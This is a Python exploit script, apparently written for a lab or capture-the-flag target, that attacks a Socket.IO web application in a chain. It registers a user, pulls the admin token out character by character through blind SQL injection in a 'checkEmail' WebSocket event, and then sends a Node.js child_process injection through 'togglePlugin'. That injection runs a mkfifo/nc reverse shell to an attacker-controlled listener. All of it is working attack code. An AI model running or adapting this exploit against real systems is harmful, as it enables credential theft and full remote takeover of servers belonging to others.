import websocket, json, time, threading, sys

class WebSocketManager:
    """WebSocket连接管理器，提供统一的连接和消息处理"""
    
    def __init__(self, base_url):
        # 标准化URL格式
        if not base_url.startswith(('http://', 'https://', 'ws://', 'wss://')):
            base_url = f"http://{base_url}"
        self.ws_url = base_url.replace("http://", "ws://").replace("https://", "wss://") + "/socket.io/?EIO=4&transport=websocket"
        
    def connect_and_execute(self, on_open_handler, on_message_handler, timeout=15):
        """
        建立WebSocket连接并执行操作
        Args:
            on_open_handler: 连接建立后的处理函数
            on_message_handler: 消息处理函数
            timeout: 超时时间
        Returns:
            (success, result): 执行结果
        """
        connected = False
        socketio_ready = False
        operation_complete = False
        result = None
        
        def on_open(ws):
            nonlocal connected
            connected = True
            print("WebSocket connection established")
            # Socket.IO 连接建立后，先等待握手完成
        
        def on_message(ws, message):
            nonlocal operation_complete, result, socketio_ready
            print(f"Received: {message}")
            
            # Socket.IO 握手消息
            if message.startswith('0{') and not socketio_ready:
                socketio_ready = True
                print("Socket.IO handshake completed")
                # 握手完成后，发送业务消息
                time.sleep(0.5)  # 稍等一下确保连接稳定
                on_open_handler(ws)
                return
            
            # Socket.IO 连接确认
            if message == "40" and not operation_complete:
                print("Socket.IO connection confirmed")
                return
            
            # 处理业务消息
            if message.startswith('42'):
                result = on_message_handler(ws, message)
                if result is not None:
                    operation_complete = True
        
        def on_error(ws, error):
            nonlocal connected
            connected = False
            print(f"WebSocket error: {error}")
        
        def on_close(ws, close_status_code, close_msg):
            nonlocal connected, operation_complete
            connected = False
            operation_complete = True
            print(f"WebSocket closed: {close_status_code} - {close_msg}")
        
        ws = websocket.WebSocketApp(
            self.ws_url,
            on_open=on_open,
            on_message=on_message,
            on_error=on_error,
            on_close=on_close
        )
        
        # 启动连接线程
        ws_thread = threading.Thread(target=ws.run_forever, daemon=True)
        ws_thread.start()
        
        # 等待操作完成
        start_time = time.time()
        while time.time() - start_time < timeout:
            if operation_complete:
                return True, result
            elif connected and socketio_ready:
                print("Waiting for response...")
            elif connected:
                print("Waiting for Socket.IO handshake...")
            else:
                print("Waiting for connection...")
            time.sleep(0.5)
        
        print("Operation timeout")
        if connected:
            ws.close()
        return False, None

def register(base_url, username, password):
    """用户注册"""
    ws_manager = WebSocketManager(base_url)
    
    def on_open_handler(ws):
        payload = f'42["postRegister",{{"firstName":"{username}","lastName":"{username}","email":"{username}@test.com","password1":"{password}","password2":"{password}"}}]'
        print("Sending registration request...")
        ws.send(payload)
        return None
    
    def on_message_handler(ws, message):
        print(f"Register response: {message}")
        ws.close()
        return True  # 注册成功
    
    success, result = ws_manager.connect_and_execute(on_open_handler, on_message_handler)
    if success:
        print("Registration completed!")
        return True
    else:
        print("Registration failed!")
        return False

def login(base_url, username, password):
    """用户登录获取token"""
    ws_manager = WebSocketManager(base_url)
    
    def on_open_handler(ws):
        payload = f'42["postLogin",{{"email":"{username}@test.com","password":"{password}"}}]'
        print("Sending login request...")
        ws.send(payload)
        return None
    
    def on_message_handler(ws, message):
        print(f"Login response: {message}")
        if message.startswith('42'):
            try:
                data = json.loads(message[2:])
                if data[0] == "user" and "token" in data[1]:
                    token = data[1]["token"]
                    print(f"Got user token: {token}")
                    ws.close()
                    return token
            except Exception as e:
                print(f"Failed to parse login response: {e}")
        return None
    
    success, token = ws_manager.connect_and_execute(on_open_handler, on_message_handler)
    if success and token:
        print("Login completed successfully!")
        return token
    else:
        print("Login failed - no token received")
        return None

def websocket_sql_injection(base_url, token, token_length=32):
    """通过WebSocket进行SQL盲注获取管理员token"""
    ws_manager = WebSocketManager(base_url)
    admin_token = ""
    
    # 持久连接用于SQL注入
    resp = None
    response_event = threading.Event()
    ws = None
    connected = False
    socketio_ready = False
    
    def on_open(ws_obj):
        nonlocal connected
        connected = True
        print("SQL injection WebSocket connection established")
    
    def on_message(ws_obj, msg):
        nonlocal resp, response_event, socketio_ready
        print(f"SQL injection received: {msg}")
        
        # Socket.IO 握手消息
        if msg.startswith('0{') and not socketio_ready:
            socketio_ready = True
            print("SQL injection Socket.IO handshake completed")
            return
        
        # Socket.IO 连接确认
        if msg == "40":
            print("SQL injection Socket.IO connection confirmed")
            return
        
        # 处理业务消息
        if msg.startswith('42'):
            try:
                data = json.loads(msg[2:])
                if data[0] == "emailFound":
                    resp = data[1]
                    response_event.set()
            except Exception as e:
                print(f"Failed to parse message: {e}")
    
    def send_injection_payload(payload, timeout=10):
        nonlocal resp, response_event, ws, connected, socketio_ready
        
        if not connected or not socketio_ready:
            print("Connection not ready, skipping request")
            return None
            
        resp = None
        response_event.clear()
        
        try:
            msg = f'42["checkEmail",{json.dumps({"token": token, "email": payload})}]'
            ws.send(msg)
            
            if response_event.wait(timeout):
                return resp
            else:
                return None
        except Exception as e:
            print(f"Failed to send message: {e}")
            return None
    
    # 建立持久连接用于SQL注入
    print("Connecting to WebSocket for SQL injection...")
    ws = websocket.WebSocketApp(
        ws_manager.ws_url,
        on_message=on_message,
        on_open=on_open,
        on_error=lambda ws, error: print(f"SQL injection WebSocket error: {error}"),
        on_close=lambda ws, code, msg: print(f"SQL injection WebSocket closed: {code} - {msg}")
    )
    
    ws_thread = threading.Thread(target=ws.run_forever, daemon=True)
    ws_thread.start()
    
    # 等待连接和握手完成
    for i in range(15):
        if connected and socketio_ready:
            break
        time.sleep(1)
        if connected and not socketio_ready:
            print(f"Waiting for Socket.IO handshake... ({i+1}/15)")
        else:
            print(f"Waiting for SQL injection connection... ({i+1}/15)")
    
    if not connected or not socketio_ready:
        print("SQL injection connection or handshake failed")
        return None
    
    print("SQL injection connection ready!")
    time.sleep(1)  # 额外等待确保连接稳定
    
    # 开始SQL注入
    print("Starting SQL injection to extract admin token...")
    for i in range(1, token_length + 1):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            payload = f"ad' OR (SELECT SUBSTRING(token,{i},1) FROM AuthTokens WHERE UserId=1)='{char}' AND email LIKE '"
            result = send_injection_payload(payload)
            if result:
                admin_token += char
                print(f"[{i}/{token_length}] {admin_token}")
                break
        else:
            print(f"Failed to extract character at position {i}")
            break
    
    if connected:
        ws.close()
    
    return admin_token

def websocket_admin_execute(base_url, admin_token, lhost, lport, timeout=15):
    """使用管理员token执行模板注入"""
    ws_manager = WebSocketManager(base_url)
    
    def on_open_handler(ws):
        command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
        injection_payload = f"chat_ws')];var m=process.mainModule.constructor._load;var cp=m('child'+'_process');cp.exec('{command}',function(){{}});//"
        
        payload = f'42["togglePlugin",{{"name":"{injection_payload}","enable":false,"token":"{admin_token}"}}]'
        print("Sending template injection payload with admin token...")
        ws.send(payload)
        return True
    
    def on_message_handler(ws, message):
        print(f"Admin WebSocket message: {message}")
        if message.startswith('42'):
            try:
                data = json.loads(message[2:])
                print(f"Template injection response: {data}")
                # 给服务器时间处理命令后关闭
                threading.Timer(2.0, lambda: ws.close()).start()
                return True
            except:
                print(f"Response received: {message}")
                threading.Timer(2.0, lambda: ws.close()).start()
                return True
        return None
    
    success, result = ws_manager.connect_and_execute(on_open_handler, on_message_handler, timeout)
    if success:
        print("Template injection execution completed!")
        return True
    else:
        print("Template injection execution failed!")
        return False

if __name__ == "__main__":
    # 支持多种输入格式：IP地址、http://IP、http://IP:PORT等
    base_url = "192.168.52.237"  # 可以直接输入IP
    username = "testuser" # 任意用户名, 每一次执行用户名需要变更
    password = "testpass"   # 任意密码
    lhost = "192.168.49.52" # 修改为反弹shell的ip
    lport = 443
    token_length = 32 # 管理员token长度，默认32位

    print(f"[+] Target: {base_url}")
    print(f"[+] Reverse shell: {lhost}:{lport}")
    print()

    print("[1] Registering user...")
    if not register(base_url, username, password):
        print("[-] Registration failed!")
        sys.exit(1)
    print("[+] Registration successful")
    time.sleep(1)

    print("\n[2] Logging in to get user token...")
    user_token = login(base_url, username, password)
    if not user_token:
        print("[-] Failed to get user token")
        sys.exit(1)
    print(f"[+] User token obtained: {user_token[:16]}...")
    time.sleep(1)

    print(f"\n[3] Extracting admin token via SQL injection...")
    admin_token = websocket_sql_injection(base_url, user_token, token_length)
    if not admin_token:
        print("[-] Failed to extract admin token")
        sys.exit(1)
    print(f"[+] Admin token extracted: {admin_token}")

    print(f"\n[4] Executing template injection attack...")
    success = websocket_admin_execute(base_url, admin_token, lhost, lport)
    
    if success:
        print("[+] Attack completed successfully!")
        print(f"[+] Check your listener on {lhost}:{lport} for reverse shell")
    else:
        print("[-] Template injection failed!")
        sys.exit(1)